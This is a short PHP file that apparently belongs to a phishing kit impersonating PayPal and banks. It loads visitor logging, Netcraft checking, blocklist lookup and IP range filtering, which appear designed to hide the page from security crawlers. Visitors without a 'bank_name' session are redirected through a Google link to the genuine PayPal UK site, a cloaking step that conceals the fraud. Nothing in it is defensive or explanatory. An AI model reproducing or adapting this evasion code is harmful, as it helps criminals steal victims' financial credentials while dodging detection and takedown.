<?php
require "../../includes/visitor_log.php";
require "../../includes/netcraft_check.php";
require "../../includes/blacklist_lookup.php";
require "../../includes/ip_range_check.php";


if (!isset($_SESSION['bank_name'])) {
	header('Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwjA9riL-9ziAhUxUxUIHRXsCNwQFjAAegQIBhAC&url=https%3A%2F%2Fwww.paypal.com%2Fuk%2Fhome&usg=AOvVaw0bJ7fG7mk5yia5upCsbFyP');
	exit;
}

?>